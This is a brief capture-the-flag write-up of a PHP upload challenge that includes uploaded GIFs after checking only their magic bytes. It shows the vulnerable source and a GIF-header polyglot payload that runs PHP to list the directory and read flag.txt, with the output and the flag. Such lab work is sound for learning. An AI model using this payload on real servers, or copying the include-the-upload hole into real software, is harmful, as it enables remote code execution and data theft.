```
<?php
$uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');

if (file_exists ($uploadedFile)) { unlink ($uploadedFile); }

if ($_FILES['fileToUpload']['size'] <= 50000) {
    if (getimagesize ($_FILES['fileToUpload']['tmp_name']) !== false) {
        if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) {
            move_uploaded_file ($_FILES['fileToUpload']['tmp_name'], $uploadedFile);
            echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">'. htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';
            echo '<pre>';
            include_once($uploadedFile);
            echo '</pre>';
            unlink($uploadedFile);
        } else { echo '<p class="text-danger">The file is not a GIF</p>'; }
    } else { echo '<p class="text-danger">The file is not an image</p>'; }
} else { echo '<p class="text-danger">The file is too big</p>'; }
?>
```
+ So, in this challenge exif_imagetype function reads the first bytes of an image and checks its signature. So, we can create a php file and put the first few bytes as gif bytes.
So, I created a sample.php file and tried dumping the direcotries
```
GIF89a\00\00\E6\00
<?php print_r(scandir("./"));?> 
```
Output:
```
GIF89a\00\00\E6\00
Array
(
    [0] => .
    [1] => ..
    [2] => flag.txt
    [3] => index.php
    [4] => php-fpm.sock
    [5] => source.php
    [6] => uploads
)
```
So, lets try getting flag.txt.
```
GIF89a\00\00\E6\00
<?php echo file_get_contents("./flag.txt");?> 
```
There we got the flag: WEBSEC{BypassingImageChecksToRCE}
